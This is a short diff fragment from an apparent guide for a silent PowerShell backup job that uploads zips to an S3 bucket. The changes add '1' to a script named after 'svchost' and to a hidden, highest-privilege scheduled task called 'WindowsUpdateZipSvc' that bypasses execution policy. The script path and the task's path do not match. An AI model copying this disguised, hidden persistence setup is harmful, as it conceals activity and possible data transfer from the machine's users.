@@ -41,13 +41,13 @@ We’ll store zips under: s3://arbrim-backups-test/zips/<COMPUTER>/
 
 PowerShell backup script (silent, uses built-in zip)
 ```
-C:\ProgramData\Microsoft\Windows\svchost\WinZipBackup.ps1
+C:\ProgramData\Microsoft\Windows\svchost\WinZipBackup1.ps1
 ```
 
 Schedule it (runs daily, completely hidden)
 ```
-schtasks /Create /TN "WindowsUpdateZipSvc" ^
-  /TR "powershell.exe -NoLogo -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\arbri\AppData\Local\SystemUpdate\WinZipBackup.ps1" ^
+schtasks /Create /TN "WindowsUpdateZipSvc1" ^
+  /TR "powershell.exe -NoLogo -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\arbri\AppData\Local\SystemUpdate\WinZipBackup1.ps1" ^
   /SC DAILY /ST 03:00 /RL HIGHEST /F
 
 ```
